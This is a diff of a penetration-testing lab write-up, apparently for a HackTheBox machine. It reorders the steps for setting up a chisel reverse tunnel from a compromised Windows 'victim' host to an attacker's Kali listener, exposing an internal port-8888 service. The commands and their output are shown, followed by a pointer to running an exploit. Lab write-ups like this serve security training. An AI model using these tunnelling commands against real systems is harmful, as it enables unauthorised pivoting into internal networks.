@@ -171,17 +171,9 @@ Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single 
 <hr>
 
 
-- on victim machine
 
-```bash
-C:\xampp\htdocs\gym\upload>.\chisel.exe client 10.10.14.12:9002  R:8888:localhost:8888
-.\chisel.exe client 10.10.14.12:9002  R:8888:localhost:8888
-2021/09/11 22:21:54 client: Connecting to ws://10.10.14.12:9002
-2021/09/11 22:21:56 client: Connected (Latency 141.1528ms)
 
-```
-
-- on kali, listen for the  connection from `chisel`
+- on kali, tunnel the traffic to connected client on port `9002`
 
 ```bash
 $ ./chisel server --reverse --port 9002
@@ -189,6 +181,17 @@ $ ./chisel server --reverse --port 9002
 2021/09/11 17:15:40 server: Fingerprint yRzWStcIB8E8d/UkCTub+Os1Qnhcm3ePt0JuZOWmTus=
 2021/09/11 17:15:40 server: Listening on http://0.0.0.0:9002
 2021/09/11 17:18:32 server: session#5: tun: proxy#R:8888=>localhost:8888: Listening
+```
+
+
+- on victim machine, tunnel all traffic to chisel server to port  `9002` of local service running on port `8888`
+
+```bash
+C:\xampp\htdocs\gym\upload>.\chisel.exe client 10.10.14.12:9002  R:8888:localhost:8888
+.\chisel.exe client 10.10.14.12:9002  R:8888:localhost:8888
+2021/09/11 22:21:54 client: Connecting to ws://10.10.14.12:9002
+2021/09/11 22:21:56 client: Connected (Latency 141.1528ms)
+
 ```
 
 - Now change the payload in python program and run the exploit
